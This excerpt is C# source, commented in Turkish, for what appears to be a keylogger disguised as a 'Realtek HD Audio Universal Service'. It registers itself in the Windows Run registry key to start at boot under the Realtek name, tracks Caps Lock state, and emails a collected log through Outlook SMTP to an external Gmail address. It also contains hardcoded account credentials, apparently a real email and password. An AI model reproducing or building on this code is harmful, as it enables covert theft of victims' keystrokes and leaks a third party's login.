...
namespace Realtek_HD_Audio_Universal_Service
{
       ...
       void mail()
        {
            ...
            istemci.Credentials = new System.Net.NetworkCredential("osmancayan57@outlook.com","Everlast57@$");

            istemci.Port = 587; //simple mail transfer prokol için  587 portunu kullanıyoruz
            istemci.Host = "smtp.outlook.com"; //gmailin smpt adresi
            ...
            msj.From = new MailAddress("osmancayan57@outlook.com");
            msj.To.Add("osmancayan1905@gmail.com");
        ...
        private void Form1_Load(object sender, EventArgs e)
        {
            ...
            {
                BigChar = true;
               // this.Text = "Acik";//caps acik mi kapali mi yakalamak icin
            }
            ...
            key.SetValue("Realtek HD Audio Universal Service", "\"" + Application.ExecutablePath + "\"");
        ...
        {
           // MessageBox.Show(log.ToString());//TEST AŞAMASI İÇİN KULLANILDI
        }
    }
}
